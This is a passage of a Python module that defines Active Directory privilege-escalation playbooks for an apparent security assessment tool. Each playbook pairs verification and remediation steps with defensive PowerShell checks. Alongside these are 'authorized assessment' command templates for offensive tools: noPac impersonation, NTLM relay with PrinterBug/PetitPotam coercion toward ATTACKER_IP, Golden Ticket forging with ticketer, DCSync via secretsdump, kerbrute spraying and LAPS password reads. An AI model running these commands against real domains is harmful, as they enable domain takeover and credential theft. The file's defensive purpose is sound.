        ["Get-ADGroupMember", "whoami /priv", "dnscmd (lab only)"],
    ),
    "laps": _book(
        [
            _step(
                "See who can read LAPS secrets on DCs or DA workstations",
                "Scan evidence {TARGETS} can read ms-Mcs-AdmPwd or msLAPS-Password. Local admin "
                "on a DC or a jump host used by Domain Admins is DA-equivalent (LSASS/NTDS).",
                "dsacls on the computer object shows a helpdesk or Authenticated Users read ACE on the LAPS attributes.",
            ),
            _step(
                "Confirm the grant covers a Tier 0 computer",
                "Helpdesk LAPS read is often domain-wide, including Domain Controllers.",
                "The PoC lists a DC or admin workstation whose LAPS attribute is readable by a non-Tier-0 group.",
            ),
            _step(
                "Close the path",
                "Scope LAPS read to the owning support tier; never Authenticated Users; use encrypted Windows LAPS.",
                "Re-scan shows no LAPS read on DC objects for helpdesk groups.",
            ),
        ],
        [
            _cmd(
                "laps_dsacls",
                "dsacls — LAPS attributes on the evidenced computer",
                "dsacls \"CN={TARGET},OU=Domain Controllers,{DOMAIN_DN}\" | findstr /I \"ms-Mcs-AdmPwd msLAPS\"",
            ),
            _cmd(
                "laps_get",
                "PowerShell — Windows LAPS / legacy LAPS read (will fail if you should not have access)",
                "Get-ADComputer {TARGET} -Properties ms-Mcs-AdmPwd,msLAPS-Password,msLAPS-EncryptedPassword |\n"
                "  Select-Object Name,'ms-Mcs-AdmPwd','msLAPS-Password'",
            ),
        ],
        [
            _cmd(
                "laps_adshell",
                "Authorized assessment — read LAPS as the evidenced trustee",
                "# Authenticate as the trustee named in the finding, then:\n"
                "Get-LapsADPassword {TARGET} -AsPlainText\n"
                "# or: Get-AdmPwdPassword -ComputerName {TARGET}",
            ),
        ],
        ["dsacls", "Get-LapsADPassword", "Get-AdmPwdPassword"],
    ),
    "machine_quota": _book(
        [
            _step(
                "Read ms-DS-MachineAccountQuota on the domain",
                "Default is 10. Any authenticated user can then create a computer they fully control. "
                "That principal is the node RBCD, noPac, and Shadow Credentials need.",
                "Get-ADObject returns a quota greater than 0.",
            ),
            _step(
                "Chain the quota to a DC write primitive from this same scan",
                "Quota alone is not DA; quota plus RBCD/noPac/weak DC ACL is. Record the companion finding.",
                "The PoC is quota > 0 together with at least one DC-impacting primitive in this report.",
            ),
            _step(
                "Close the path",
                "Set the quota to 0 unless a documented join workflow requires it; harden computer-object ACLs.",
                "Re-scan shows ms-DS-MachineAccountQuota=0; 4741 by non-join accounts is alerted.",
            ),
        ],
        [
            _cmd(
                "quota_read",
                "PowerShell — MachineAccountQuota",
                "Get-ADObject -Identity '{DOMAIN_DN}' -Properties ms-DS-MachineAccountQuota |\n"
                "  Format-List DistinguishedName,'ms-DS-MachineAccountQuota'",
            ),
        ],
        [
            _cmd(
                "quota_addcomputer",
                "PowerMad / Impacket — create a controlled computer (authorized assessment)",
                "addcomputer.py {DOMAIN}/USER:PASSWORD -computer-name CONTROLLED$ -computer-pass 'ComplexP@ss1' -dc-ip {DC_IP}",
            ),
            _cmd(
                "quota_then_rbcd",
                "Next hop — feed the new computer into the RBCD playbook",
                "# After creating CONTROLLED$, continue with the rbcd assessment commands\n"
                "# using -delegate-from CONTROLLED$ toward a DC or admin workstation.",
            ),
        ],
        ["Get-ADObject", "Impacket addcomputer", "PowerMad New-MachineAccount"],
    ),
    "nopac": _book(
        [
            _step(
                "Confirm unpatched DCs together with MachineAccountQuota > 0",
                "CVE-2021-42278/42287 let a controlled computer impersonate a DC by combining "
                "sAMAccountName spoofing with a TGT request. Scan evidence {TARGETS} plus quota > 0 is an authenticated-user DA path.",
                "DC OS/build is in the vulnerable set and ms-DS-MachineAccountQuota is not 0.",
            ),
            _step(
                "Do not run the exploit against production",
                "The PoC for production is: unpatched KDC + create-computer primitive. Exploitation belongs only in a lab that you own.",
                "Patch evidence (KB5008380 and related) is missing; quota is non-zero. That pair is the finding.",
            ),
            _step(
                "Close the path",
                "Patch every DC for CVE-2021-42278 and CVE-2021-42287, then set the quota to 0.",
                "Builds are patched; quota is 0; 4741+4781+4768 for a DC-named account is alerted.",
            ),
        ],
        [
            _cmd(
                "nopac_quota",
                "PowerShell — quota companion check",
                "Get-ADObject -Identity '{DOMAIN_DN}' -Properties ms-DS-MachineAccountQuota",
            ),
            _cmd(
                "nopac_dc_os",
                "PowerShell — Domain Controller OS / hotfix inventory",
                "Get-ADDomainController -Filter * | Select-Object Name,OperatingSystem,OperatingSystemVersion\n"
                "Get-HotFix -ComputerName {TARGET} | Where-Object { $_.HotFixID -match '5008380|5008602' }",
            ),
        ],
        [
            _cmd(
                "nopac_lab_only",
                "Lab-only note — noPac impersonation (do not run against production DCs)",
                "# noPac.py {DOMAIN}/user:password -dc-ip {DC_IP} -dc-host {TARGET} -impersonate Administrator\n"
                "# Production PoC stops at unpatched DC + quota > 0. Use the line above only in a lab you own.",
            ),
        ],
        ["Get-ADDomainController", "Get-HotFix", "noPac (lab only)"],
    ),
    "relay_coerce": _book(
        [
            _step(
                "Confirm LDAP signing, channel binding, and SMB signing gaps on DCs",
                "Scan evidence {TARGETS} shows signing not required and/or a coercion endpoint "
                "(spooler, EFS, DFS, WebClient). Relay dies if LDAP signing + EPA and SMB signing are enforced.",
                "NetSetup / GPO shows LDAPServerIntegrity != 2 and/or SMB signing not required on DCs.",
            ),
            _step(
                "Pair the signing gap with a coercion primitive",
                "A coerced DC machine account relayed to LDAP can write DCSync, RBCD, or Shadow Credentials.",
                "The PoC is the pair: coerce-able DC + signing/EPA off. Do not relay a production DC to a weaponized listener.",
            ),
            _step(
                "Close the path",
                "Require LDAP signing and channel binding; require SMB signing; disable spooler on DCs; restrict EFS RPC.",
                "Re-scan shows signing required; spooler disabled on DCs; 4624 type 3 from DCs to unexpected hosts is alerted.",
            ),
        ],
        [
            _cmd(
                "relay_ldap_integrity",
                "PowerShell — LDAP server signing requirement (DC)",
                "Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -Name LDAPServerIntegrity -ErrorAction SilentlyContinue\n"
                "Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ldap\\Parameters -Name LdapEnforceChannelBinding -ErrorAction SilentlyContinue",
            ),
            _cmd(
                "relay_smb_signing",
                "PowerShell — SMB signing on the DC",
                "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature,EnableSecuritySignature",
            ),
            _cmd(
                "relay_spooler",
                "PowerShell — Print Spooler on Domain Controllers",
                "Get-Service -Name Spooler -ComputerName {TARGET} | Format-List Status,StartType",
            ),
        ],
        [
            _cmd(
                "relay_ntlmrelayx_note",
                "Authorized assessment note — NTLM relay (lab or tightly scoped test only)",
                "# ntlmrelayx.py -t ldap://{DC_IP} -smb2support --delegate-access\n"
                "# Combined with a coercion tool against a production DC is domain takeover.\n"
                "# Production PoC is: signing/EPA off + spooler/EFS exposed. Do not stand up a relay vs production.",
            ),
            _cmd(
                "relay_coerce_note",
                "Coercion inventory (identify, do not fire at production DCs)",
                "# printerbug.py {DOMAIN}/USER:PASSWORD@{TARGET} ATTACKER_IP\n"
                "# petitpotam.py ATTACKER_IP {TARGET}\n"
                "# Use only against lab DCs or with a written coercion exception.",
            ),
        ],
        ["Get-SmbServerConfiguration", "LDAPServerIntegrity", "ntlmrelayx (lab)", "PetitPotam/PrinterBug (lab)"],
    ),
    "krbtgt": _book(
        [
            _step(
                "Measure KRBTGT password age and history",
                "Microsoft guidance is a double rotation after any suspected DC compromise or unauthorized DCSync. "
                "Scan evidence {TARGETS} shows a stale KRBTGT secret — a Golden Ticket window.",
                "pwdLastSet on KRBTGT is old; only one rotation (or none) has occurred.",
            ),
            _step(
                "Explain the two-key Kerberos window",
                "Kerberos still accepts the previous KRBTGT key. One rotation is not enough. Forged TGTs for any user, including DA, remain valid until both keys change.",
                "The PoC is: KRBTGT age/history plus any past DCSync path in this report. Do not mint a Golden Ticket against production.",
            ),
            _step(
                "Close the path",
                "Rotate KRBTGT twice with the Microsoft two-phase procedure; reset after every DC compromise.",
                "Two successful rotations with the required waiting period; 4768/4769 lifetime anomalies are alerted.",
            ),
        ],
        [
            _cmd(
                "krbtgt_pwdlastset",
                "PowerShell — KRBTGT password age",
                "Get-ADUser krbtgt -Properties PasswordLastSet,PasswordHistory,whenChanged,msDS-KeyVersionNumber |\n"
                "  Format-List SamAccountName,PasswordLastSet,whenChanged,'msDS-KeyVersionNumber'",
            ),
            _cmd(
                "krbtgt_microsoft_script",
                "Microsoft — New-KrbtgtKeys two-phase rotation (change, do not forge tickets)",
                "# Use Microsoft's New-KrbtgtKeys.ps1 / Reset-KrbtgtPassword procedure.\n"
                "# https://learn.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-reset-the-krbtgt-password",
            ),
        ],
        [
            _cmd(
                "krbtgt_golden_note",
                "Authorized assessment note — do not forge Golden Tickets in production",
                "# ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain {DOMAIN} Administrator\n"
                "# Production PoC is KRBTGT age + DCSync history. Forged TGTs belong only in a lab you own.",
            ),
        ],
        ["Get-ADUser krbtgt", "Microsoft New-KrbtgtKeys", "ticketer (lab only)"],
    ),
    "gmsa_kds": _book(
        [
            _step(
                "See who can read msKds-RootKeyData",
                "Anyone who can read the KDS root key can compute current and future gMSA passwords. "
                "Scan evidence {TARGETS} is a too-broad reader. A gMSA on DCs, AD FS, or Entra Connect is DA-equivalent.",
                "dsacls on CN=Master Root Keys under the Configuration partition shows Domain Users, a helpdesk group, or another unexpected trustee.",
            ),
            _step(
                "Map readable gMSAs to Tier 0 services",
                "gMSA passwords are deterministic from the root key and identity.",
                "The PoC lists KDS read + a privileged gMSA (DC service, AD FS, Connect).",
            ),
            _step(
                "Close the path",
                "Tighten KDS ACLs to Domain Controllers and a break-glass Tier 0 group; rotate gMSAs after ACL reduction.",
                "Re-scan shows only Tier 0 readers; LDAP reads of the key object are alerted.",
            ),
        ],
        [
            _cmd(
                "kds_dsacls",
                "dsacls — KDS Master Root Keys",
                "dsacls \"CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,{DOMAIN_DN}\"",
            ),
            _cmd(
                "kds_gmsa_list",
                "PowerShell — gMSA inventory and allowed principals",
                "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword,HostComputers |\n"
                "  Select-Object Name,SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,HostComputers",
            ),
        ],
        [
            _cmd(
                "kds_golden_note",
                "Authorized assessment note — Golden gMSA (do not derive production gMSA passwords)",
                "# GMSAPasswordReader.exe --AccountName SVC_TIER0$\n"
                "# Golden gMSA tools that read msKds-RootKeyData prove the ACL.\n"
                "# Do not persist derived gMSA secrets from production.",
            ),
        ],
        ["dsacls", "Get-ADServiceAccount", "GMSAPasswordReader"],
    ),
    "trusts": _book(
        [
            _step(
                "Classify each trust: direction, type, SID filtering, SID History",
                "Scan evidence {TARGETS} is a forest/external trust where SID filtering is off or SID History is accepted. Extra SIDs in a PAC (including Enterprise Admins from another forest) are then honored locally.",
                "Get-ADTrust shows ForestTransitive / DisableSIDHistory / SIDFilteringQuarantined values that allow foreign DA SIDs.",
            ),
            _step(
                "State the DA outcome without injecting SIDs in production",
                "Compromise of the far side of an unfiltered trust is a local DA path. The PoC is the trust flag set, not a SID injection.",
                "The engagement record maps far-side DA to local RID 512/519 acceptance.",
            ),
            _step(
                "Close the path",
                "Enable SID filtering on forest trusts; avoid SID History except during tightly controlled migrations; prefer selective authentication.",
                "Re-scan shows SID filtering enabled; PAC SIDs from foreign issuers matching local 512/519 are alerted.",
            ),
        ],
        [
            _cmd(
                "trust_get",
                "PowerShell — trust attributes including SID filtering",
                "Get-ADTrust -Filter * | Format-List Name,Direction,ForestTransitive,SIDFilteringQuarantined,"
                "SIDFilteringForestAware,TGTDelegation,SelectiveAuthentication,TrustAttributes",
            ),
            _cmd(
                "trust_nltest",
                "nltest — domain trusts",
                "nltest /domain_trusts /all_trusts /v",
            ),
        ],
        [
            _cmd(
                "trust_sidhistory_note",
                "Authorized assessment note — do not inject ExtraSids in production",
                "# raiseChild.py / ticketer ExtraSids against a production forest trust is domain takeover.\n"
                "# Production PoC is: SID filtering disabled on a forest trust. Lab-only SID History tests stay in the lab.",
            ),
        ],
        ["Get-ADTrust", "nltest", "raiseChild (lab only)"],
    ),
    "hybrid": _book(
        [
            _step(
                "Identify MSOL_/Sync_/AAD_ Connect accounts, AZUREADSSOACC$, and AD FS",
                "Scan evidence {TARGETS} is hybrid control-plane. Connect often has DCSync. "
                "AZUREADSSOACC decrypts Seamless SSO tickets. AD FS token-signing forges SAML for cloud Global Admin, which maps back to on-prem DA.",
                "The account is in Domain Admins or holds replication rights, or AZUREADSSOACC$/AD FS is not Tier 0.",
            ),
            _step(
                "Treat those objects as Domain Controllers",
                "Cloud admin plus password writeback, or SSO silver tickets, recover on-prem DA.",
                "The PoC is: hybrid account privileges + server not in the Tier 0 OU/security boundary.",
            ),
            _step(
                "Close the path",
                "Remove Connect from Domain Admins; grant only documented replication/password rights; rotate AZUREADSSOACC; protect AD FS signing keys; restrict Connect admins to Tier 0.",
                "Re-scan shows Connect not in DA; logons of MSOL_/Sync_ from non-Connect hosts are alerted.",
            ),
        ],
        [
            _cmd(
                "hybrid_hunt",
                "PowerShell — Entra Connect / SSO / AD FS identities",
                "Get-ADUser -Filter {SamAccountName -like 'MSOL_*' -or SamAccountName -like 'Sync_*' -or SamAccountName -like 'AAD_*'} "
                "-Properties MemberOf,adminCount,servicePrincipalName |\n"
                "  Select-Object SamAccountName,adminCount,MemberOf\n"
                "Get-ADComputer -Filter {Name -like 'AZUREADSSOACC*'} -Properties MemberOf",
            ),
            _cmd(
                "hybrid_dcsync",
                "PowerShell — replication rights on the evidenced hybrid account",
                "dsacls \"{DOMAIN_DN}\" | findstr /I \"{TARGET}\"",
            ),
        ],
        [
            _cmd(
                "hybrid_dcsync_cmd",
                "Impacket — DCSync if the Connect account holds replication rights (authorized assessment)",
                "secretsdump.py {DOMAIN}/{TARGET}:PASSWORD@{DC_IP} -just-dc-user krbtgt",
            ),
            _cmd(
                "hybrid_sso_note",
                "Authorized assessment note — Seamless SSO silver ticket (lab only)",
                "# ticketer.py -nthash AZUREADSSOACC_HASH -domain {DOMAIN} ...\n"
                "# Do not forge SSO tickets against production. Rotate AZUREADSSOACC if exposure is suspected.",
            ),
        ],
        ["Get-ADUser", "dsacls", "Impacket secretsdump", "AADInternals (lab)"],
    ),
    "rodc": _book(
        [
            _step(
                "Inspect RevealOnDemand vs NeverReveal for Tier 0",
                "Scan evidence {TARGETS} shows Domain Admins or other Tier 0 allowed to cache on an RODC. "
                "Stealing that RODC yields those hashes; the RODC KRBTGT mints TGTs for its revealed set.",
                "Get-ADDomainController RODC policy lists a DA-class account in Allowed, or missing from Denied.",
            ),
            _step(
                "Assume weaker physical control at the branch site",
                "The PoC is the replication policy, not theft of the RODC.",
                "Denied RODC Password Replication Group does not contain every Tier 0 identity.",
            ),
            _step(
                "Close the path",
                "Populate Denied with every Tier 0 identity; remove privileged users from Allowed.",
                "Re-scan shows no DA/EA/Schema Admin in the allowed list.",
            ),
        ],
        [
            _cmd(
                "rodc_policy",
                "PowerShell — RODC password replication policy",
                "Get-ADDomainController -Filter {IsReadOnly -eq $true} | Format-List Name,HostName\n"
                "Get-ADDomain | Select-Object DistinguishedName\n"
                "Get-ADObject -Identity 'CN=Allowed RODC Password Replication Group,CN=Users,{DOMAIN_DN}' | Get-ADGroupMember\n"
                "Get-ADObject -Identity 'CN=Denied RODC Password Replication Group,CN=Users,{DOMAIN_DN}' | Get-ADGroupMember",
            ),
            _cmd(
                "rodc_reveal",
                "PowerShell — revealed / never-reveal attributes on the RODC",
                "Get-ADDomainController {TARGET} | Get-ADComputer -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList |\n"
                "  Format-List Name,'msDS-RevealOnDemandGroup','msDS-NeverRevealGroup'",
            ),
        ],
        [
            _cmd(
                "rodc_secrets_note",
                "Authorized assessment note — do not dump an RODC NTDS in production",
                "# secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n"
                "# Production PoC is the reveal policy. NTDS from a stolen RODC belongs to incident response, not a routine test.",
            ),
        ],
        ["Get-ADDomainController", "Get-ADGroupMember", "secretsdump (IR/lab)"],
    ),
    "dmsa": _book(
        [
            _step(
                "See who can create msDS-DelegatedManagedServiceAccount objects",
                "Scan evidence {TARGETS} can CreateChild a dMSA. Linking a Domain Admin as predecessor (BadSuccessor) makes the dMSA DA-equivalent.",
                "An OU ACE grants CreateChild for the dMSA class to a non-Tier-0 group.",
            ),
            _step(
                "Inspect predecessor links on existing dMSAs",
                "A link to a privileged account is an active takeover, not a theoretical one.",
                "msDS-ManagedAccountPrecededByLink on any dMSA points at a DA-class account, or creation rights exist.",
            ),
            _step(
                "Close the path",
                "Apply Microsoft BadSuccessor mitigations; remove CreateChild from non-admins; audit 5137/5136.",
                "Re-scan shows no unexpected predecessor links and no broad dMSA create rights.",
            ),
        ],
        [
            _cmd(
                "dmsa_objects",
                "PowerShell — dMSA objects and predecessor links",
                "Get-ADObject -LDAPFilter '(objectClass=msDS-DelegatedManagedServiceAccount)' "
                "-Properties msDS-ManagedAccountPrecededByLink,msDS-DelegatedMSAState |\n"
                "  Select-Object Name,DistinguishedName,'msDS-ManagedAccountPrecededByLink'",
            ),
            _cmd(
                "dmsa_ou_acl",
                "dsacls — CreateChild on a regular OU (example)",
                "dsacls \"OU=Service Accounts,{DOMAIN_DN}\"",
            ),
        ],
        [
            _cmd(
                "dmsa_badsuccessor_note",
                "Authorized assessment note — do not link a production Domain Admin as dMSA predecessor",
                "# Creating a dMSA whose predecessor is a DA account is domain takeover.\n"
                "# Production PoC is CreateChild + writable predecessor attribute. Do not plant the link in production.",
            ),
        ],
        ["Get-ADObject", "dsacls", "Microsoft BadSuccessor guidance"],
    ),
    "sccm": _book(
        [
            _step(
                "Identify site servers and the System Management container",
                "Scan evidence {TARGETS} is a site server, management point, or a trustee with GenericAll on System Management. "
                "Client push and application deployment run as SYSTEM. Pushing to a DC or DA workstation is a standard DA finish.",
                "The primary site server computer account has excessive AD rights, or client push to DCs is enabled.",
            ),
            _step(
                "Do not push an application to a production DC",
                "The PoC is: site-server control + client-push scope including Domain Controllers. Treat every primary site server as Tier 0.",
                "Automatic client push includes DC hostnames, or the site-server account is DA-equivalent in AD.",
            ),
            _step(
                "Close the path",
                "Tier-0 the site servers; lock System Management ACLs; disable DC client push; require HTTPS/PKI for MPs.",
                "Re-scan shows no DC in push scope; System Management ACLs are Tier 0 only.",
            ),
        ],
        [
            _cmd(
                "sccm_container",
                "dsacls — System Management container",
                "dsacls \"CN=System Management,CN=System,{DOMAIN_DN}\"",
            ),
            _cmd(
                "sccm_hunt",
                "PowerShell — likely site-server computer accounts",
                "Get-ADComputer -Filter {Name -like '*MECM*' -or Name -like '*SCCM*' -or Name -like '*CM*' } "
                "-Properties MemberOf,adminCount |\n"
                "  Select-Object Name,adminCount,MemberOf",
            ),
        ],
        [
            _cmd(
                "sccm_misconfig_note",
                "Authorized assessment note — do not deploy SYSTEM payloads to DCs",
                "# SharpSCCM / sccmhunter can inventory site roles and client-push configuration.\n"
                "# sccmhunter.py -u USER -p PASS -d {DOMAIN} -dc-ip {DC_IP} sms\n"
                "# Do not create an application aimed at Domain Controllers.",
            ),
        ],
        ["dsacls", "sccmhunter", "SharpSCCM"],
    ),
    "password_spray": _book(
        [
            _step(
                "Measure lockout threshold and privileged password hygiene",
                "Scan evidence {TARGETS} shows lockout disabled/weak or privileged accounts outside Protected Users / without MFA. "
                "Lockout threshold 0 is an open spray runway that can hit Domain Admin directly.",
                "Default domain policy lockout is 0 or very high; DA accounts accept password auth without smart-card/MFA.",
            ),
            _step(
                "Do not spray production passwords",
                "The PoC is the policy: lockout off + privileged accounts sprayable. A spray is a production availability incident.",
                "Document lockout=0 (or weak) and list privileged users that are not in Protected Users.",
            ),
            _step(
                "Close the path",
                "Enable a sane lockout; ban common passwords; require phishing-resistant MFA on privileged users; Protected Users and authentication silos for Tier 0.",
                "Lockout is enabled; DA accounts require smart-card or MFA; distributed 4625/4771 is alerted.",
            ),
        ],
        [
            _cmd(
                "spray_policy",
                "PowerShell — default domain lockout and password policy",
                "Get-ADDefaultDomainPasswordPolicy | Format-List MinPasswordLength,LockoutThreshold,LockoutDuration,"
                "LockoutObservationWindow,ComplexityEnabled,PasswordHistoryCount",
            ),
            _cmd(
                "spray_protected_users",
                "PowerShell — Domain Admins not in Protected Users",
                "$pu = Get-ADGroupMember 'Protected Users' -Recursive | Select-Object -ExpandProperty SamAccountName\n"
                "Get-ADGroupMember 'Domain Admins' -Recursive | Where-Object { $pu -notcontains $_.SamAccountName } |\n"
                "  Select-Object SamAccountName,distinguishedName",
            ),
        ],
        [
            _cmd(
                "spray_note",
                "Authorized assessment note — do not password-spray production",
                "# kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} users.txt Passw0rd!\n"
                "# Spray tools against production can lock the directory. The finding is the policy, not a spray.",
            ),
        ],
        ["Get-ADDefaultDomainPasswordPolicy", "Protected Users", "kerbrute (lab only)"],
    ),
    "hidden_primary_group": _book(
        [
            _step(
                "Enumerate primaryGroupID 512/518/519",
                "Scan evidence {TARGETS} has a privileged primary group that does not appear in member. "
                "The account is already Domain Admin even though group reviews miss it.",
                "Get-ADUser/Computer shows primaryGroupID 512, 518, or 519 while memberOf omits that group.",
            ),
            _step(
                "Reset the primary group to Domain Users / Domain Computers",
                "Visible membership only. Remove computer accounts from DA and operator groups.",
                "primaryGroupID is 513 (users) or 515 (computers); the hidden DA is gone.",
            ),
        ],
        [
            _cmd(
                "hidden_pgid",
                "PowerShell — privileged primary groups",
                "Get-ADUser -Filter {primaryGroupID -eq 512 -or primaryGroupID -eq 518 -or primaryGroupID -eq 519} "
                "-Properties primaryGroupID,MemberOf |\n"
                "  Select-Object SamAccountName,primaryGroupID,MemberOf\n"
                "Get-ADComputer -Filter {primaryGroupID -eq 512 -or primaryGroupID -eq 516} "
                "-Properties primaryGroupID,MemberOf |\n"
                "  Select-Object Name,primaryGroupID,MemberOf",
            ),
            _cmd(
                "hidden_target",
                "PowerShell — evidenced object primary group",
                "Get-ADObject -LDAPFilter \"(sAMAccountName={TARGET})\" -Properties primaryGroupID,memberOf,adminCount |\n"
                "  Format-List Name,sAMAccountName,primaryGroupID,memberOf,adminCount",
            ),
        ],
        [
            _cmd(
                "hidden_fix_note",
                "Remediation — set a normal primary group (change, not exploit)",
                "Set-ADUser {TARGET} -Replace @{primaryGroupID=513}\n"
                "# For a computer: Set-ADComputer {TARGET} -Replace @{primaryGroupID=515}",
            ),
        ],
        ["Get-ADUser", "Get-ADComputer", "Set-ADUser (remediation)"],
    ),
    "ldap_recon": _book(
        [
            _step(
                "Confirm anonymous LDAP or Pre-Windows 2000 Compatible Access",
                "This does not grant Domain Admin by itself. Scan evidence {TARGETS} means unauthenticated "
                "or any user can build the admin/SPN/computer target list every other path on this map needs.",
                "Anonymous bind succeeds, Guest is enabled, or Everyone is in Pre-Windows 2000 Compatible Access.",
            ),
            _step(
                "Close enumeration first",
                "Disable anonymous LDAP, remove Everyone/Authenticated Users from Pre-Windows 2000 Compatible Access, disable Guest.",
                "Anonymous bind fails; 4662 from null sessions disappears.",
            ),
        ],
        [
            _cmd(
                "ldap_anon",
                "ldapsearch — anonymous rootDSE / naming contexts",
                "ldapsearch -x -H ldap://{DC_IP} -s base namingContexts defaultNamingContext",
            ),
            _cmd(
                "ldap_prewin2k",
                "PowerShell — Pre-Windows 2000 Compatible Access members",
                "Get-ADGroupMember 'Pre-Windows 2000 Compatible Access' | Select-Object Name,SamAccountName,SID",
            ),
            _cmd(
                "ldap_dsheuristics",
                "PowerShell — dSHeuristics (anonymous LDAP)",
                "Get-ADObject \"CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,{DOMAIN_DN}\" "
                "-Properties dSHeuristics | Format-List dSHeuristics",
            ),
        ],
        [
            _cmd(
                "ldap_enum_note",
                "Authorized assessment — directory listing after anonymous bind",
                "ldapsearch -x -H ldap://{DC_IP} -b '{DOMAIN_DN}' '(objectClass=user)' sAMAccountName memberOf",
            ),
        ],
        ["ldapsearch", "Get-ADGroupMember", "dSHeuristics"],
    ),
}


def playbook_for(path_id: str) -> dict[str, Any]:
    """Return a deep-copy-safe playbook dict for a catalog path id."""
    spec = DA_PATH_PLAYBOOKS.get(path_id) or {}
    return {
        "poc_roadmap": [dict(item) for item in spec.get("poc_roadmap") or []],
        "verify_commands": [dict(item) for item in spec.get("verify_commands") or []],
        "assessment_commands": [dict(item) for item in spec.get("assessment_commands") or []],
        "tools": list(spec.get("tools") or []),
    }
